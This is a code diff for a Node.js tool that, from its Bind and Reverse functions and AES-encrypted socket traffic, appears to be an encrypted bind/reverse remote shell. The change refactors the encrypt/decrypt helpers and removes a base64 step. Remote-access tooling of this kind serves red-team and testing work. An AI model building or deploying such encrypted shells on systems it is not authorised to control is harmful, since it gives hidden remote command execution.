@@ -1,10 +1,9 @@
 const { createServer } = require("net")
 const { createInterface } = require("readline")
 const { spawn } = require("child_process")
-const { CryptorAES, b64coder } = require('./crypt')
-const {listen_address, listen_port, aes_password, aes_iv} = require('./server_config.json')
+const { CryptorAES } = require('./crypt')
+const { listen_address, listen_port, aes_password, aes_iv } = require('./server_config.json')
 
-const b64 = new b64coder()
 const crypt = new CryptorAES(aes_password, aes_iv)
 
 const config = {
@@ -14,15 +13,14 @@ const config = {
 }
 
 function translate_out(cleartext){
-    const encodedData = b64.encode_b64(cleartext.toString())
-    const encrypted = crypt.encrypt(encodedData)
+    const buffer = Buffer.from(cleartext, 'utf-8')
+    const encrypted = crypt.encrypt(buffer)
     return(encrypted)
 }
 
-function translate_in(ciphertext){
-    const decrypted = crypt.decrypt(ciphertext.toString())
-    const decodedData = b64.decode_b64(decrypted)
-    return(decodedData)
+function translate_in(encBuff){
+    const decrypted = crypt.decrypt(encBuff).toString('utf-8')
+    return(decrypted)
 }
 
 function Bind(){
@@ -83,8 +81,7 @@ function Reverse(){
     
         const int = createInterface({
             input: process.stdin,
-            output: process.stdout,
-            prompt: ""
+            output: process.stdout
         })
     
         int.on("line", (data) => {
@@ -97,7 +94,7 @@ function Reverse(){
         })
     
         socket.on("data", (data) => {
-            console.log(`${translate_in(data)}`)
+            console.log(translate_in(data))
         })
     
         socket.on("error", (err) => {
